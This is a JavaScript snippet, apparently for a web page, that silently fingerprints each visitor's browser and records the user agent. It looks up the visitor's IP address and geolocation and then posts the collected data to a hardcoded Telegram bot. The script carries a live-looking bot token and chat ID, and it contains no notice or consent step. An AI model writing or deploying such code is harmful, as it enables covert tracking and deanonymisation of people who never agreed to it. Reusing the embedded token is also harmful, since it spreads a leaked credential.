
var userData = {
    "IP": [],
    "fingerprintHash": '',
    "userAgent": navigator.userAgent
}


new Fingerprint2().get(function(fingerprint, components){
  // this will use all available fingerprinting sources
  userData.fingerprintHash = fingerprint
    
  // components is an array of all fingerprinting components used
});


var sendInfo = function(endpoint){
    endpoint='https://api.telegram.org/bot1144251938:AAFc1ywZOJUeb2fzSw54fVBTxdarxAVuM20/sendMessage';
    $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {
      userData.IP=dataIP;
    });
    setTimeout(function(){
        var xhr = new XMLHttpRequest();
        xhr.open("POST", endpoint, true);
        xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
        // send the collected data as JSON
  //      xhr.send(JSON.stringify(userData));
        data={'chat_id': 1290297888, 'text': userData}
        xhr.send(JSON.stringify(data));
        xhr.onloadend = function () {
        // done
        } 
    }, 3000)
}
